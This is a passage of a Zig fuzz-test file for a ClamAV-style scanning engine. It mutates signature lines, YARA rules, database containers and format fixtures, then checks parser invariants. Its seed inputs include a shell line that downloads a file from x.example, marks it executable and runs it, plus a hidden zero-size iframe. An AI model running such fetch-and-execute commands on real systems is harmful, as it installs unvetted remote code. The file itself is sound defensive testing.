        const rec = fx.table.records[l];
        var c: [3]u32 = undefined;
        for (0..rec.nsub) |i| c[i] = if (rec.flags & lt.flag_counts != 0) counts[l][i] else @intFromBool(counts[l][i] > 0);
        want[l] = lt.evalRpn(fx.table.expr(rec), c[0..rec.nsub]);
    }
    var out: [lines.len]u32 = undefined;
    const n = fx.state.finalize(fx.table, "", &out);
    var got: [lines.len]bool = @splat(false);
    for (out[0..n]) |l| got[l] = true;
    if (!std.mem.eql(bool, &want, &got)) @panic("fuzz: sparse logical state disagrees with the dense reference");
}

/// Byte-compare subsigs: mutated text through the parser, then evaluation at random trigger
/// starts over random data; a binary compare is checked against a direct read.
fn byteCompare(random: std.Random) void {
    const lt = zav.match.ldb_table;
    const seeds = [_][]const u8{
        "0(>>4#hb2#=0x10)",
        "0(<<0x10#hle8#>1,<0xffff)",
        "0(>>2#de3#=123)",
        "0(>>2#a6#<0x1f)",
        "0(>>1#il4#=0x04030201)",
        "0(>>0#ib8#>5)",
    };
    var buf: [64]u8 = undefined;
    const seed = seeds[random.uintLessThan(usize, seeds.len)];
    @memcpy(buf[0..seed.len], seed);
    const text = mutate(random, &buf, seed.len, "0123456789abcdefx#<>=,hdailbe()");
    const bc = zav.compile.ldb.parseByteCompare(text, 1) catch return;
    const rec = lt.BcRecord.from(1, bc);
    var data: [40]u8 = undefined;
    const alphabet = "0123456789abcdefABCDEFx \x00\xff";
    for (&data) |*b| b.* = alphabet[random.uintLessThan(usize, alphabet.len)];
    const len = random.uintAtMost(usize, data.len);
    const start = random.uintAtMost(usize, len + 4);
    const got = lt.evalByteCompare(rec, data[0..len], start);
    if (bc.kind == .binary and !bc.backward) {
        const pos = start +| bc.offset;
        if (pos + bc.width > len) {
            if (got != .out_of_bounds) @panic("fuzz: byte compare read past the data");
            return;
        }
        const v = if (bc.big_endian) std.mem.readVarInt(u64, data[pos..][0..bc.width], .big) else std.mem.readVarInt(u64, data[pos..][0..bc.width], .little);
        // Without a byte order the compare never holds (libclamav).
        var want = !bc.no_order;
        for (bc.comparisons[0..bc.comparison_count]) |c| want = want and switch (c.op) {
            .lt => v < c.value,
            .gt => v > c.value,
            .eq => v == c.value,
            _ => false,
        };
        if ((got == .yes) != want) @panic("fuzz: binary byte compare disagrees with a direct read");
    }
}

/// `.ftm` lines.
fn ftmLine(random: std.Random) void {
    const seeds = [_][]const u8{
        "0:0:4d5a:DOS executable:CL_TYPE_ANY:CL_TYPE_MSEXE",
        "1:*:504b0304:ZIP-SFX:CL_TYPE_MSEXE:CL_TYPE_ZIPSFX:76",
        "4:1024:482b0004:HFS+ partition:CL_TYPE_PART_ANY:CL_TYPE_PART_HFSPLUS::150",
        "1:8:6674797068{2}6963:HEIC:CL_TYPE_ANY:CL_TYPE_GRAPHICS",
    };
    var mem: [32 * 1024]u8 = undefined;
    var fba: std.heap.FixedBufferAllocator = .init(&mem);
    var buf: [160]u8 = undefined;
    const seed = seeds[random.uintLessThan(usize, seeds.len)];
    @memcpy(buf[0..seed.len], seed);
    const line = mutate(random, &buf, seed.len, "0123456789abcdef:*?{}CL_TYPE_ANYZIP");
    var column: u32 = 0;
    if (zav.compile.ftm.parseLine(fba.allocator(), line, &column)) |rule| {
        if ((rule.kind == .body) != (rule.pattern != null)) @panic("fuzz: ftm body kind without a pattern");
    } else |_| {
        if (column > line.len) @panic("fuzz: ftm column out of range");
    }
}

var ftm_mem: [256 * 1024]u8 align(8) = undefined;

/// Classification of random heads against a fixed set of overlapping magics, and corrupted copies
/// of its trie.
fn ftmClassify(random: std.Random) void {
    const zc = zav.compile;
    const text =
        \\0:0:4d5a:DOS:CL_TYPE_ANY:CL_TYPE_MSEXE
        \\0:0:504b0304:ZIP:CL_TYPE_ANY:CL_TYPE_ZIP
        \\0:0:504b:PK:CL_TYPE_ANY:CL_TYPE_BINARY_DATA
        \\0:4:4142:AB:CL_TYPE_ANY:CL_TYPE_GIF
        \\0:2:4e53:NS:CL_TYPE_MSEXE:CL_TYPE_NULSFT
        \\1:0:3c68{1}6d:HTMLish:CL_TYPE_ANY:CL_TYPE_HTML
        \\1:*:504b0304:SFX:CL_TYPE_MSEXE:CL_TYPE_ZIPSFX
        \\4:8:4842:Part:CL_TYPE_ANY:CL_TYPE_PART_HFSPLUS
        \\
    ;
    var fba: std.heap.FixedBufferAllocator = .init(&ftm_mem);
    const a = fba.allocator();
    var rules: std.ArrayList(zc.ir.FtmRule) = .empty;
    var rejected: std.ArrayList(zc.ir.Rejection) = .empty;
    zc.ftm.parse(a, a, "f.ftm", text, .{ .rules = &rules, .rejected = &rejected }) catch unreachable;
    const built = zc.ftm_build.build(a, rules.items) catch unreachable;
    const pbytes = zc.prog_build.build(a, built.programs) catch unreachable;
    const pimage = a.alignedAlloc(u8, .@"4", pbytes.len) catch unreachable;
    @memcpy(pimage, pbytes);
    const programs = zav.match.prog.Programs.init(pimage) catch unreachable;
    const image = a.alignedAlloc(u8, .@"4", built.trie.len) catch unreachable;
    @memcpy(image, built.trie);
    if (random.boolean()) for (0..1 + random.uintLessThan(usize, 4)) |_| {
        image[random.uintLessThan(usize, image.len)] = random.int(u8);
    };
    const f = zav.fmt.ftm.Ftm.init(image, programs) catch return;
    var head: [64]u8 = undefined;
    const alphabet = "MZPK\x03\x04ABNS<hm HB\x00\x01";
    for (&head) |*b| b.* = if (random.uintLessThan(u8, 4) == 0) random.int(u8) else alphabet[random.uintLessThan(usize, alphabet.len)];
    var budget: zav.match.verify_vm.Budget = .{ .per_verify = 1000, .per_file = 20_000 };
    const c = zav.fmt.ftm.classify(f, head[0..random.uintAtMost(usize, head.len)], .{ .partitions = random.uintLessThan(u8, 4) == 0 }, &budget);
    for (c.embedded()) |t| if (t.offset > head.len) @panic("fuzz: ftm trigger outside the head");
}

/// `.cdb` lines.
fn cdbLine(random: std.Random) void {
    const seeds = [_][]const u8{
        "Zip.Exploit.A-1-0:CL_TYPE_ZIP:100-200:*:50:*:1:2-4:8a4f1c2e:*:81:255",
        "Any.Container-2-0:*:*:*:*:*:*:*:*:*",
        "Rar.B-3-0:CL_TYPE_RAR:*:.*\\.scr:*:1000-2000:0:1:*:*",
    };
    var buf: [128]u8 = undefined;
    const seed = seeds[random.uintLessThan(usize, seeds.len)];
    @memcpy(buf[0..seed.len], seed);
    const line = mutate(random, &buf, seed.len, "0123456789abcdef:*-CL_TYPE_ZIP");
    var column: u32 = 0;
    var mem: [256 * 1024]u8 = undefined;
    var fba: std.heap.FixedBufferAllocator = .init(&mem);
    if (zav.compile.cdb.parseLine(fba.allocator(), line, &column)) |rule| {
        if ((rule.filename_regex != null) != (rule.filename_program != null)) @panic("fuzz: cdb regex without a program");
        if (rule.filename_program) |blob| _ = zav.regex.Program.load(blob) catch @panic("fuzz: cdb regex program does not load");
        if (rule.file_pos) |p| if (p.lo == 0) @panic("fuzz: cdb position 0");
    } else |_| {
        if (column > line.len) @panic("fuzz: cdb column out of range");
    }
}

/// YARA rule files: mutated rules through the parser; whatever compiles has a valid condition.
fn yaraRule(random: std.Random) !void {
    const seeds = [_][]const u8{
        "rule A : t { meta: x = \"y\" strings: $a = \"eval(\" nocase wide $b = { 4D 5A [2-4] 00 (90|CC) } condition: $a and #b > 1 or $b at 0 }",
        "rule B { strings: $r = /ht+p[s]?:\\/\\/x/i $t = \"abc\" xor(1-2) condition: 2 of them and uint16(0) == 0x5a4d and filesize < 1MB }",
        "private rule C { strings: $a = \"zz\" $b = \"yy\" condition: any of ($a*) and @a[1] + 4 < 100 and not $b in (0..10) }",
    };
    var mem: [512 * 1024]u8 = undefined;
    var fba: std.heap.FixedBufferAllocator = .init(&mem);
    const a = fba.allocator();
    var buf: [320]u8 = undefined;
    const seed = seeds[random.uintLessThan(usize, seeds.len)];
    @memcpy(buf[0..seed.len], seed);
    const text = mutate(random, &buf, seed.len, "{}()[]$#@!\"/:=<>&|^~*-+ 0123456789abcdefandornotofthemat");
    var rules: std.ArrayList(zav.compile.yara.Rule) = .empty;
    var rejected: std.ArrayList(zav.compile.ir.Rejection) = .empty;
    zav.compile.yara.parse(a, a, "f.yar", text, .{ .rules = &rules, .rejected = &rejected }) catch |err| switch (err) {
        error.OutOfMemory => return,
    };
    for (rules.items) |r| {
        if (!zav.match.yara_cond.check(r.cond, r.strings.len)) @panic("fuzz: yara rule with an invalid condition");
        if (r.strings.len == 0 or r.strings.len > zav.compile.ir.max_subsigs) @panic("fuzz: yara string count");
    }
}

/// Random condition programs: check refuses the malformed ones, and anything it accepts
/// evaluates over random inputs without crashing.
fn yaraCond(random: std.Random) void {
    const yc = zav.match.yara_cond;
    var ops: [24]yc.CondOp = undefined;
    const n = 1 + random.uintLessThan(usize, ops.len);
    const codes = [_]yc.CondCode{ .push, .filesize, .found, .count, .at, .in, .offset, .read, .add, .sub, .mul, .div, .mod, .neg, .bnot, .band, .bor, .bxor, .shl, .shr, .eq, .ne, .lt, .le, .gt, .ge, .land, .lor, .lnot };
    for (ops[0..n]) |*o| o.* = .{ .code = codes[random.uintLessThan(usize, codes.len)], .str = random.uintLessThan(u8, 3), .k = switch (random.uintLessThan(u8, 4)) {
        0 => random.int(i64),
        1 => 4,
        2 => 2,
        else => random.intRangeAtMost(i64, -3, 70),
    } };
    if (!yc.check(ops[0..n], 3)) return;
    var data: [32]u8 = undefined;
    random.bytes(&data);
    var starts: [3][4]u64 = undefined;
    var strings: [3]yc.StringState = undefined;
    for (&strings, &starts) |*st, *ss| {
        const k = random.uintAtMost(usize, 4);
        for (ss[0..k]) |*x| x.* = random.uintAtMost(u64, 40);
        std.mem.sortUnstable(u64, ss[0..k], {}, std.sort.asc(u64));
        st.* = .{ .count = @intCast(k + random.uintAtMost(usize, 2)), .starts = ss[0..k], .overflow = random.boolean() };
    }
    _ = yc.evaluate(ops[0..n], .{ .data = data[0..random.uintAtMost(usize, data.len)], .filesize = random.int(u64), .strings = &strings });
    _ = yc.canMatchWithoutHits(ops[0..n]);
}

/// CVD/CLD header parsing, verification and member walking over mutated containers.
fn cvdContainer(gpa: std.mem.Allocator, random: std.Random, original: []const u8) !void {
    const cvd = zav.compile.cvd;
    var buf: [8192]u8 = undefined;
    const len = @min(original.len, buf.len);
    @memcpy(buf[0..len], original[0..len]);
    var input = buf[0..len];
    const flips = random.uintLessThan(usize, 8);
    for (0..flips) |_| input[random.uintLessThan(usize, input.len)] = random.int(u8);
    if (random.boolean()) input = input[0..random.uintLessThan(usize, input.len + 1)];

    if (input.len < cvd.header_len) {
        _ = cvd.parseHeader(input) catch {};
        return;
    }
    const header = cvd.parseHeader(input[0..cvd.header_len]) catch return;
    var body: std.Io.Reader = .fixed(input[cvd.header_len..]);
    cvd.verify(header, &body, .{ .allow_unverified = true }) catch {};
    var walk_body: std.Io.Reader = .fixed(input[cvd.header_len..]);
    var drain: cvd.Drain = .{};
    cvd.walk(gpa, header, &walk_body, .{}, &drain) catch {};
}

/// Detached CVD signatures: mutated and truncated DER envelopes, and mutated `.sign` text, must
/// fail cleanly (the digest is the fixture's, so only an untouched envelope may verify).
fn cvdSign(random: std.Random) void {
    const sign = zav.compile.cvd_sign;
    const S = struct {
        var der_buf: [16 * 1024]u8 = undefined;
        var der_len: usize = 0;
        var digest: [32]u8 = undefined;
    };
    if (S.der_len == 0) {
        const text = sign.fixture_sign;
        const start = std.mem.indexOf(u8, text, "pkcs7-pem:").? + "pkcs7-pem:".len;
        const end = std.mem.indexOfAnyPos(u8, text, start, "\r\n").?;
        const d = std.base64.standard.Decoder;
        S.der_len = d.calcSizeForSlice(text[start..end]) catch unreachable;
        d.decode(S.der_buf[0..S.der_len], text[start..end]) catch unreachable;
        std.crypto.hash.sha2.Sha256.hash(zav.compile.cvd.fixture_cvd, &S.digest, .{});
    }
    var buf: [16 * 1024]u8 = undefined;
    @memcpy(buf[0..S.der_len], S.der_buf[0..S.der_len]);
    const input = mutate(random, &buf, S.der_len, &.{ 0x00, 0x01, 0x02, 0x03, 0x04, 0x06, 0x30, 0x31, 0x7f, 0x80, 0x81, 0x82, 0x84, 0xa0, 0xff });
    sign.verifyPkcs7(input, &S.digest, &sign.fixture_pin) catch {};

    var text_buf: [16 * 1024]u8 = undefined;
    @memcpy(text_buf[0..sign.fixture_sign.len], sign.fixture_sign);
    const text = mutate(random, &text_buf, sign.fixture_sign.len, "#:0123456789ABCabc+/=\n");
    var heap: [32 * 1024]u8 = undefined;
    var fba: std.heap.FixedBufferAllocator = .init(&heap);
    sign.verify(fba.allocator(), text, &S.digest, &sign.fixture_pin) catch {};
}

/// Hash database lines: mutated valid lines through every hash format.
fn hashLine(random: std.Random) void {
    const hashsig = zav.compile.hashsig;
    const seeds = [_][]const u8{
        "44d88612fea8a8f36de82e1278abb02f:68:Eicar-Test-Signature",
        "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f:*:Eicar-Test-Signature:73:200",
        "45056:3395856ce81f2b7382dee72602f798b642f14140:Win.Trojan.Y-2-0",
    };
    const exts = [_][]const u8{ "hdb", "hsb", "mdb", "msb", "imp", "hdu" };
    var buf: [160]u8 = undefined;
    const seed = seeds[random.uintLessThan(usize, seeds.len)];
    @memcpy(buf[0..seed.len], seed);
    var line = buf[0..seed.len];
    for (0..random.uintLessThan(usize, 6)) |_| line[random.uintLessThan(usize, line.len)] = random.int(u8);
    if (random.boolean()) line = line[0..random.uintLessThan(usize, line.len + 1)];
    _ = hashsig.parseLine(hashsig.formatFor(exts[random.uintLessThan(usize, exts.len)]).?, line) catch {};
}

/// Hash-index section validation must reject corrupt sections instead of reading out of bounds.
/// Starts from real sections (a bitmap and a list need map, a table, SIGMETA) and corrupts them.
fn hashSections(random: std.Random) void {
    const hashidx = zav.match.hashidx;
    const S = struct {
        var built: ?zav.compile.hash_build.Built = null;
    };
    if (S.built == null) {
        const gpa = std.heap.page_allocator;
        var rules: [6000]zav.compile.ir.HashRule = undefined;
        var prng = std.Random.DefaultPrng.init(1);
        for (&rules, 0..) |*r, i| {
            var digest: [32]u8 = undefined;
            prng.random().bytes(&digest);
            r.* = .{ .algo = if (i % 50 == 0) .sha256 else .md5, .scope = .file, .digest = digest, .size = prng.random().uintLessThan(u64, 1 << 25), .name = if (i % 2 == 0) "Win.Trojan.A-1-0" else "Win.Trojan.B-7", .source = .hdb };
        }
        S.built = zav.compile.hash_build.build(gpa, &rules) catch @panic("fuzz: build");
    }
    const b = &S.built.?;
    var need_buf: [64 * 1024]u8 align(8) = undefined;
    const need = b.need_maps[0].?;
    const n = @min(need.len, need_buf.len);
    @memcpy(need_buf[0..n], need[0..n]);
    for (0..random.uintLessThan(usize, 8)) |_| need_buf[random.uintLessThan(usize, @min(n, 160))] = random.int(u8);
    for (0..random.uintLessThan(usize, 8)) |_| need_buf[random.uintLessThan(usize, n)] = random.int(u8);
    if (hashidx.NeedMap.init(need_buf[0..random.uintLessThan(usize, n + 1)])) |map| {
        for (0..16) |_| _ = map.mask(random.int(u64) % (hashidx.dense_limit * 2));
    } else |_| {}

    var hot_buf: [32 * 1024]u8 align(8) = undefined;
    var cold_buf: [128 * 1024]u8 = undefined;
    const hot = b.hot[0].?;
    const cold = b.cold[0].?;
    const hn = @min(hot.len, hot_buf.len);
    const cn = @min(cold.len, cold_buf.len);
    @memcpy(hot_buf[0..hn], hot[0..hn]);
    @memcpy(cold_buf[0..cn], cold[0..cn]);
    for (0..random.uintLessThan(usize, 6)) |_| hot_buf[random.uintLessThan(usize, @min(hn, 96))] = random.int(u8);
    for (0..random.uintLessThan(usize, 6)) |_| hot_buf[random.uintLessThan(usize, hn)] = random.int(u8);
    if (hashidx.Table.init(hot_buf[0..random.uintLessThan(usize, hn + 1)], cold_buf[0..cn])) |t| {
        var d: [32]u8 = undefined;
        random.bytes(&d);
        _ = t.lookup(random.int(u64) % (1 << 25), d[0..t.algo.digestLen()]);
    } else |_| {}

    var meta_buf: [64 * 1024]u8 align(8) = undefined;
    const mn = @min(b.sigmeta.len, meta_buf.len);
    @memcpy(meta_buf[0..mn], b.sigmeta[0..mn]);
    for (0..random.uintLessThan(usize, 6)) |_| meta_buf[random.uintLessThan(usize, mn)] = random.int(u8);
    if (hashidx.SigMeta.init(meta_buf[0..random.uintLessThan(usize, mn + 1)], b.names.?.namePool())) |meta| {
        var name: [256]u8 = undefined;
        for (0..4) |_| _ = meta.name(random.uintLessThan(u32, @intCast(meta.count() + 2)), &name) catch {};
    } else |_| {}
}

/// Multihash on a random runnable kernel variant, random algorithm subset, random update splits
/// and random speculative limits, against std.crypto on the same bytes.
fn multihashDiff(random: std.Random) void {
    const hash = zav.hash;
    var data: [3000]u8 = undefined;
    const len = random.uintAtMost(usize, data.len);
    random.bytes(data[0..len]);

    const features = zav.simd.arch.detect();
    var runnable: [8]*const hash.Kernels = undefined;
    var n: usize = 0;
    for (hash.dispatch.all) |*k| if (hash.dispatch.supports(features, k.requires)) {
        runnable[n] = k;
        n += 1;
    };
    runnable[n] = &hash.dispatch.portable;
    n += 1;
    const kernels = runnable[random.uintLessThan(usize, n)];

    var algos: hash.Set = .empty;
    var limits: hash.Limits = .{};
    inline for (comptime std.enums.values(hash.Algo)) |algo| {
        if (random.boolean()) algos.insert(algo);
        if (random.uintLessThan(u8, 4) == 0) @field(limits, @tagName(algo)) = random.uintAtMost(u64, data.len);
    }

    var m = hash.Multihash.init(algos, .{ .limits = limits, .kernels = kernels });
    var off: usize = 0;
    while (off < len) {
        const cut = @min(len - off, random.uintAtMost(usize, 300));
        m.update(data[off..][0..cut]);
        off += cut;
    }
    const d = m.final();

    inline for (comptime std.enums.values(hash.Algo)) |algo| {
        const name = @tagName(algo);
        const over = if (@field(limits, name)) |limit| len > limit else false;
        const want_computed = algos.contains(algo) and !over;
        if (d.computed.contains(algo) != want_computed) @panic("fuzz: multihash computed set");
        if (d.dropped.contains(algo) != (algos.contains(algo) and over)) @panic("fuzz: multihash dropped set");
        if (want_computed) {
            const Std = switch (algo) {
                .md5 => std.crypto.hash.Md5,
                .sha1 => std.crypto.hash.Sha1,
                .sha256 => std.crypto.hash.sha2.Sha256,
            };
            var want: [Std.digest_length]u8 = undefined;
            Std.hash(data[0..len], &want, .{});
            if (!std.mem.eql(u8, &want, &@field(d, name))) @panic("fuzz: multihash digest differs from std on " ++ name);
        }
    }
}

var lzfse_in: [256 * 1024]u8 = undefined;
var lzfse_out: [512 * 1024]u8 = undefined;
var lzfse_scratch: zav.fmt.lzfse.Scratch = undefined;

/// LZFSE and LZVN streams (disk image chunks): mutated reference vectors decoded into a buffer
/// that is sometimes too small; errors are fine, out-of-bounds access is not.
fn lzfseDecode(random: std.Random) void {
    const vs = zav.fmt.fixtures.lzfse_vectors;
    const v = vs[random.uintLessThan(usize, vs.len)];
    const len = @min(v.compressed.len, lzfse_in.len);
    @memcpy(lzfse_in[0..len], v.compressed[0..len]);
    var input = lzfse_in[0..len];
    for (0..random.uintLessThan(usize, 8)) |_| input[random.uintLessThan(usize, input.len)] = random.int(u8);
    if (random.uintLessThan(u8, 4) == 0) input = input[0..random.uintLessThan(usize, input.len + 1)];
    const out_len = if (random.boolean()) @min(v.plain_len, lzfse_out.len) else random.uintLessThan(usize, lzfse_out.len);
    _ = zav.fmt.lzfse.decode(input, lzfse_out[0..out_len], &lzfse_scratch) catch {};
}

/// Format parsers and decoders: one target per format, taken in turn, each mutating that
/// format's fixtures and scanning the result through the real dispatcher, positionally or as a
/// stream. Limits are tight so a case stays cheap; the invariants are no crash, no hang, and
/// every scratch byte released when the walk returns.
const Formats = struct {
    io: std.Io,
    scratch: zav.engine.scratch.Scratch,
    budget: zav.engine.budget.Budget,
    spill: std.Io.Dir,
    buf: [64 * 1024]u8 = undefined,

    const fixtures = zav.fmt.fixtures;
    const Target = struct { name: []const u8, inputs: []const []const u8 };
    const targets = [_]Target{
        .{ .name = "fmt.gzip", .inputs = vectors(&fixtures.gzip_vectors) },
        .{ .name = "fmt.bzip2", .inputs = vectors(&fixtures.bzip2_vectors) },
        .{ .name = "fmt.xz", .inputs = vectors(&fixtures.xz_vectors ++ fixtures.lzma_vectors) },
        .{ .name = "fmt.zstd", .inputs = vectors(&fixtures.zstd_vectors) },
        .{ .name = "fmt.bomb", .inputs = vectors(&fixtures.bomb_vectors) },
        .{ .name = "fmt.tar", .inputs = archives(".tar") },
        .{ .name = "fmt.cpio", .inputs = archives(".cpio") },
        .{ .name = "fmt.zip", .inputs = archives(".zip") },
        .{ .name = "fmt.ole2", .inputs = archives(".doc") },
        .{ .name = "fmt.ooxml", .inputs = archives(".docx") ++ archives(".docm") },
        .{ .name = "fmt.pe", .inputs = exes(".exe") },
        .{ .name = "fmt.elf", .inputs = exes(".elf") },
        .{ .name = "fmt.macho", .inputs = exes(".macho") ++ exes(".fat") },
        .{ .name = "fmt.iso9660", .inputs = archives(".iso") },
        .{ .name = "fmt.cab", .inputs = archives(".cab") },
        .{ .name = "fmt.dmg", .inputs = archives(".dmg") },
        .{ .name = "fmt.nsis", .inputs = exes("nsis-") },
        .{ .name = "fmt.chm", .inputs = archives(".chm") },
        .{ .name = "fmt.upx", .inputs = exes("upx-") },
        .{ .name = "fmt.html", .inputs = &.{
            "<!DOCTYPE html><HTML><head><title>T</title><script>var a = '<b>' + 1;</script></head>" ++
                "<body onload=\"go()\" class='x y'>Hello &amp; &#x41;&#65;&nbsp;<!-- c --> <a href=x>l</a></body></HTML>",
            "<script type=text/javascript>if (a < b && c > d) { document.write('</scr' + 'ipt>'); }</script>" ++
                "<iframe src=\"http://e.example/\" width=0 height=0></iframe>",
            "<html><body><form action=x><input name=a value=\"&quot;q&quot;\"></form><!-- unterminated",
        } },
        .{ .name = "fmt.mime", .inputs = &zav.fmt.mime.evasion_bytes },
        .{ .name = "fmt.pdf", .inputs = documents(".pdf") },
        .{ .name = "fmt.js", .inputs = &zav.fmt.js_norm.fuzz_pages },
        .{ .name = "fmt.rtf", .inputs = documents(".rtf") },
        .{ .name = "fmt.7z", .inputs = documents(".7z") },
        .{ .name = "fmt.text", .inputs = &.{
            "Plain TEXT with\tTabs and\r\nCRLF lines\n\n  and   runs of   SPACE\x00\x01",
            "#!/bin/sh\nwget http://x.example/a -O /tmp/a && chmod +x /tmp/a && /tmp/a\n",
        } },
    };

    fn vectors(comptime vs: []const fixtures.Vector) []const []const u8 {
        comptime var out: [vs.len][]const u8 = undefined;
        inline for (vs, 0..) |v, i| out[i] = v.compressed;
        const final = out;
        return &final;
    }

    fn archives(comptime needle: []const u8) []const []const u8 {
        @setEvalBranchQuota(1_000_000);
        comptime var n: usize = 0;
        inline for (fixtures.archives) |a| {
            if (comptime std.mem.indexOf(u8, a.name, needle) != null) n += 1;
        }
        comptime var out: [n][]const u8 = undefined;
        comptime var i: usize = 0;
        inline for (fixtures.archives) |a| {
            if (comptime std.mem.indexOf(u8, a.name, needle) != null) {
                out[i] = a.bytes;
                i += 1;
            }
        }
        const final = out;
        return &final;
    }

    fn documents(comptime ext: []const u8) []const []const u8 {
        @setEvalBranchQuota(1_000_000);
        const all = zav.fmt.docs.docs;
        comptime var n: usize = 0;
        inline for (all) |d| {
            if (comptime std.mem.endsWith(u8, d.name, ext)) n += 1;
        }
        comptime var out: [n][]const u8 = undefined;
        comptime var i: usize = 0;
        inline for (all) |d| {
            if (comptime std.mem.endsWith(u8, d.name, ext)) {
                out[i] = d.bytes;
                i += 1;
            }
        }
        const final = out;
        return &final;
    }

    fn exes(comptime needle: []const u8) []const []const u8 {
        @setEvalBranchQuota(1_000_000);
        comptime var n: usize = 0;
        inline for (fixtures.exes) |e| {
            if (comptime std.mem.indexOf(u8, e.name, needle) != null) n += 1;
        }
        comptime var out: [n][]const u8 = undefined;
        comptime var i: usize = 0;
        inline for (fixtures.exes) |e| {
            if (comptime std.mem.indexOf(u8, e.name, needle) != null) {
                out[i] = e.bytes;
                i += 1;
            }
        }
        const final = out;
        return &final;
    }

    fn init(io: std.Io) !Formats {
        return .{
            .io = io,
            .scratch = try .init(64 * 1024 * 1024),
            .budget = .init(64 * 1024 * 1024),
            .spill = try std.Io.Dir.cwd().createDirPathOpen(io, ".zig-cache/zav-fuzz", .{}),
        };
    }

    fn deinit(f: *Formats) void {
        f.spill.close(f.io);
        f.scratch.deinit();
    }

    const Sink = struct {
        bytes: u64 = 0,
        fn visitor(s: *Sink) zav.engine.container.Visitor {
            return .{ .ptr = s, .vtable = &.{ .enter = enter, .data = data, .leave = leave, .notice = notice } };
        }
        fn enter(_: *anyopaque, _: *const zav.engine.container.Object) error{Stop}!void {}
        fn data(ptr: *anyopaque, _: *const zav.engine.container.Object, bytes: []const u8) error{Stop}!void {
            const s: *Sink = @ptrCast(@alignCast(ptr));
            s.bytes += bytes.len;
        }
        fn leave(_: *anyopaque, _: *const zav.engine.container.Object) void {}
        fn notice(_: *anyopaque, _: zav.engine.container.Notice) void {}
    };

    fn run(f: *Formats, random: std.Random, i: usize, only: []const u8) usize {
        if (only.len == 0) {
            f.case(random, targets[i % targets.len]);
            return 1;
        }
        var n: usize = 0;
        for (targets) |t| if (std.mem.indexOf(u8, t.name, only) != null) {
            f.case(random, t);
            n += 1;
        };
        return n;
    }

    fn case(f: *Formats, random: std.Random, target: Target) void {
        const original = target.inputs[random.uintLessThan(usize, target.inputs.len)];
        const len = @min(original.len, f.buf.len);
        @memcpy(f.buf[0..len], original[0..len]);
        var input = f.buf[0..len];
        mutateBytes(random, &input, f.buf.len);

        var tracker = zav.engine.limits.Tracker.init(.{
            .max_file_size = 1024 * 1024,
            .max_scan_size = 8 * 1024 * 1024,
            .max_total_output = 4 * 1024 * 1024,
            .max_files = 200,
            .max_scan_time_ms = 0,
        });
        var sink: Sink = .{};
        var w: zav.engine.container.Walker = .{
            .io = f.io,
            .scratch = &f.scratch,
            .tracker = &tracker,
            .budget = &f.budget,
            .spill_dir = f.spill,
            .visitor = sink.visitor(),
            .parse = zav.fmt.scan.parse,
            .options = .{ .budget_wait_ms = 0 },
        };
        if (random.boolean()) {
            w.scan(.{ .memory = input }, target.name) catch {};
        } else {
            var r: std.Io.Reader = .fixed(input);
            w.scan(.{ .stream = .{ .reader = &r } }, target.name) catch {};
        }
        if (f.scratch.used() != 0) @panic("fuzz: scratch not released after a walk");
        if (f.budget.used.load(.monotonic) != 0) @panic("fuzz: big-window token leaked");
        f.scratch.reset();
    }

    /// Byte flips, a truncation, a duplicated or deleted span.
    fn mutateBytes(random: std.Random, input: *[]u8, cap: usize) void {
        const in = input.*;
        if (in.len == 0) return;
        switch (random.uintLessThan(u8, 4)) {
            0 => for (0..1 + random.uintLessThan(usize, 8)) |_| {
                in[random.uintLessThan(usize, in.len)] = random.int(u8);
            },
            1 => input.* = in[0..random.uintLessThan(usize, in.len + 1)],
            2 => {
                const at = random.uintLessThan(usize, in.len);
                const n = @min(random.uintLessThan(usize, 64) + 1, in.len - at, cap - in.len);
                std.mem.copyBackwards(u8, input.*.ptr[at + n .. in.len + n], in[at..]);
                input.* = input.*.ptr[0 .. in.len + n];
            },
            else => {
                const at = random.uintLessThan(usize, in.len);
                const n = @min(random.uintLessThan(usize, 64) + 1, in.len - at);
                std.mem.copyForwards(u8, in[at .. in.len - n], in[at + n ..]);
                input.* = in[0 .. in.len - n];
                if (input.*.len > 0) input.*[random.uintLessThan(usize, input.*.len)] ^= 1;
            },
        }
    }
};
